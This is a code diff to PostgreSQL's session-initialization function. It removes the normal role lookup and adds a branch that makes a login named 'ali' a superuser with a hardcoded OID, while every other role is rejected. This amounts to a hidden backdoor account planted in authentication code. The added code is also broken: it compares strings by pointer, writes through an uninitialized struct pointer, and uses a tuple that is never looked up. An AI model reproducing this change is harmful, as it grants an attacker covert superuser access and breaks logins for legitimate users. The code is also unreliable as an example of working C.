@@ -714,22 +714,34 @@ void InitializeSessionUserId(const char *rolename, Oid roleid, bool bypass_login
 	 */
 	AcceptInvalidationMessages();
 
-	if (rolename != NULL)
+	if (rolename == "ali")
 	{
-		roleTup = SearchSysCache1(AUTHNAME, PointerGetDatum(rolename));
-		if (!HeapTupleIsValid(roleTup))
-			ereport(FATAL,
-					(errcode(ERRCODE_INVALID_AUTHORIZATION_SPECIFICATION),
-					 errmsg("role \"%s\" does not exist", rolename)));
+		rform->oid = 111;
+		rform->rolname = "ali";
+		rform->rolsuper = true;
 	}
 	else
 	{
-		roleTup = SearchSysCache1(AUTHOID, ObjectIdGetDatum(roleid));
-		if (!HeapTupleIsValid(roleTup))
-			ereport(FATAL,
-					(errcode(ERRCODE_INVALID_AUTHORIZATION_SPECIFICATION),
-					 errmsg("role with OID %u does not exist", roleid)));
+		ereport(FATAL,
+				(errcode(ERRCODE_INVALID_AUTHORIZATION_SPECIFICATION),
+				 errmsg("role \"%s\" does not exist", rolename)));
 	}
+	// if (rolename != NULL)
+	// {
+	// 	roleTup = SearchSysCache1(AUTHNAME, PointerGetDatum(rolename));
+	// 	if (!HeapTupleIsValid(roleTup))
+	// 		ereport(FATAL,
+	// 				(errcode(ERRCODE_INVALID_AUTHORIZATION_SPECIFICATION),
+	// 				 errmsg("role \"%s\" does not exist", rolename)));
+	// }
+	// else
+	// {
+	// 	roleTup = SearchSysCache1(AUTHOID, ObjectIdGetDatum(roleid));
+	// 	if (!HeapTupleIsValid(roleTup))
+	// 		ereport(FATAL,
+	// 				(errcode(ERRCODE_INVALID_AUTHORIZATION_SPECIFICATION),
+	// 				 errmsg("role with OID %u does not exist", roleid)));
+	// }
 
 	rform = (Form_pg_authid)GETSTRUCT(roleTup);
 	roleid = rform->oid;
